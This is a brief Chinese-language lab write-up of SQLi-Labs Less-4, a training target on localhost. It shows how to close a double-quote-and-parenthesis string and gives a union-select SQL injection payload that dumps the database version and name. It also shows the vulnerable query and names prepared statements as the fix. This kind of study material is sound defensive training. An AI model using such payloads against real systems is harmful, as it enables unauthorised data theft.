# SQLi-Labs | Less-4 GET 双引号+括号 字符注入
## 一、漏洞简介
参数被 ("$id") 包裹，闭合需要 ")，可联合查询脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-4/?id=1
## 三、复现步骤
1. ?id=1' 不报错，?id=1" 报错，确定双引号
2. 闭合：?id=1") and 1=1 --+
3. 联合查询脱库
## 四、Payload
?id=-1") union select 1,version(),database() --+
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE id=("$id") LIMIT 0,1`
## 六、修复方案
预编译查询。
## 七、总结
双引号+括号闭合，和Less3对应，只是引号换成双引号。